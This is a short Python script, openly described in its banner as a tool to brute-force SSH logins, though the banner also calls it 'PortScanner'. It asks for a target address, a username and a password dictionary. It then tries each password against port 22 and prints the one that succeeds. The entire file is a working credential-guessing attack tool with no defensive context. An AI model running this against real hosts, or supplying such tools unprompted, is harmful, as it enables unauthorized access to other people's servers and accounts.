import paramiko, sys, os, socket
from colorama import Fore

print(Fore.YELLOW + "\n~ Welcome to PortScanner ~") 
print(Fore.YELLOW + "\nCreated By:") 
print(Fore.WHITE + " ____  _  _       ___")       
print(Fore.WHITE + "|  _ \| || | ____/ _ \ _ __") 
print(Fore.WHITE + "| |_) | || ||_  / | | | '__|")
print(Fore.WHITE + "|  _ <|__   _/ /| |_| | |   ")
print(Fore.WHITE + "|_| \_\  |_|/___|\___/|_|   ")

print(Fore.YELLOW + "\nWeb Page: https://juankaenel.com \n")
print(Fore.YELLOW + "[Info] Tool developed in python to brute force the ssh service \n")
print(Fore.YELLOW + "----------------------------------------------------------------------------------\n")            


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host,port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    
    ssh.close()
    return code


host = input('[*] Target address: ')
username = input('[*] SSH Username: ')
input_file = input('[*] Passwords dictionary: ')
print('\n')

if os.path.exists(input_file) == False:
    print(Fore.RED + '[!] That dictionary/path doesnt exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(Fore.GREEN + '[+] Found password: ' + password + ' , for account: ' + username)
                break
            elif response == 1:
                print(Fore.RED + '[-] Incorrect login, the password doesn\'t match: ' + password)
            elif response == 2:
                print(Fore.RED + '[-] Can\'t connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
                
